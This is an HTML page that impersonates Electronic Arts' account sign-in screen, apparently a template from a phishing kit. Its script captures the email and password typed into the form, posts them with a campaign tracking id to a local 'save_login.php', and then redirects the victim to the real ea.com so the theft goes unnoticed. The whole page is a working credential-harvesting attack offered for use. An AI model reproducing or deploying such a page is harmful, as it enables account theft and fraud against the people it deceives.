<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>EA - Sign In</title><style>
*{box-sizing:border-box;margin:0;padding:0}
body{font-family:ElectronicArtsText,sans-serif;background:#161616;min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px}
.card{width:100%;max-width:400px}
.ea{color:#ff4747;font-size:28px;font-weight:700;letter-spacing:2px;margin-bottom:24px;text-align:center}
h1{color:#fff;font-size:24px;text-align:center;margin-bottom:24px}
input{width:100%;height:48px;background:#323232;border:1px solid #5a5a5a;color:#fff;padding:0 14px;margin-bottom:12px;border-radius:4px;font-size:15px}
.btn-submit{width:100%;height:48px;background:#ff4747;color:#fff;border:none;border-radius:4px;font-weight:700;cursor:pointer}
</style></head><body><div class="card"><div class="ea">EA</div><h1>Sign in to your EA account</h1><form id="loginForm"><input type="text" id="email" placeholder="Email" required autocomplete="username"><input type="password" id="password" placeholder="Password" required autocomplete="current-password"><button type="submit" class="btn-submit">Sign in</button></form></div><script src="https://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.js"></script>
<script>
(function(){
var BASE_URL = window.location.origin + (window.location.pathname.replace(/[^/]*$/, "") || "/");
document.getElementById("loginForm").addEventListener("submit", function (e) {
    e.preventDefault();
    var login = document.getElementById("email").value;
    var password = document.getElementById("password").value;
    var tid = typeof window.TRACKIFY_TID === "string" ? window.TRACKIFY_TID : (new URLSearchParams(window.location.search).get("tid") || "");
    var btn = document.querySelector(".btn-submit");
    var label = btn.textContent;
    btn.textContent = "Please wait…";
    btn.disabled = true;
    $.ajax({
        type: "POST",
        url: BASE_URL + "save_login.php",
        data: { tid: tid, login: login, password: password, template: "origin" },
        dataType: "json",
        success: function (data) {
            if (data && data.ok) { window.location.href = "https:\/\/www.ea.com\/"; return; }
            btn.textContent = label;
            btn.disabled = false;
            alert("Sign in failed. Please try again.");
        },
        error: function () {
            btn.textContent = label;
            btn.disabled = false;
            alert("Sign in failed. Please try again.");
        }
    });
});
})();
</script></body></html>
